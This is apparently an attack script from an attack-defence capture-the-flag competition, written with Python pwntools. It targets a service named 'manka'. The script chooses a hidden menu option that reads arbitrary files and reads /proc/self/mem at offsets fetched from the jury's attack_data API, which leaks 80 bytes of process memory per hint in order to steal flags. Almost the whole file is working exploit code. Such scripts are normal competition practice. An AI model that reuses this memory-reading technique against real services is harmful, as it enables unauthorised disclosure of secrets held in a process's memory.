#!/usr/bin/env python3

from pwn import *
import string
import sys
import requests

context.log_level = 'warn'

secret_size = 40
address = sys.argv[1]
port = 7191
TASKNAME = 'manka'
ALPH = string.digits + string.ascii_letters
JURY_IP = "10.10.10.10"

def file_api_read_memory(memaddr, size):
    conn = remote(address, port)
    conn.recvuntil(b': ')
    conn.sendline(b'3')
    conn.recvuntil(b': ')
    conn.sendline(b'/proc/self/mem')
    conn.recvuntil(b': ')
    adr_str = str(memaddr).encode()
    adr_str
    conn.sendline(adr_str)
    conn.recvuntil(b': ')
    conn.sendline(str(size).encode())
    conn.recvuntil(b': ')
    memory = conn.recvuntil(b'\n', drop=True)
    conn.recv()
    conn.close()
    return memory


def proc_self_mem_vuln(checker_key):
    """There's third secret option that allows us to read any file content.

    We can read /proc/self/mem with address offset to retrive any data we
    want.
    """
    return file_api_read_memory(int(checker_key.decode('utf8'), 16), 80)


def get_attack_data():
    return requests.get(f'http://{JURY_IP}/api/client/attack_data').json()[TASKNAME][address]


at_d = get_attack_data()
for hint in at_d:
    print(proc_self_mem_vuln(hint.encode()), flush=True)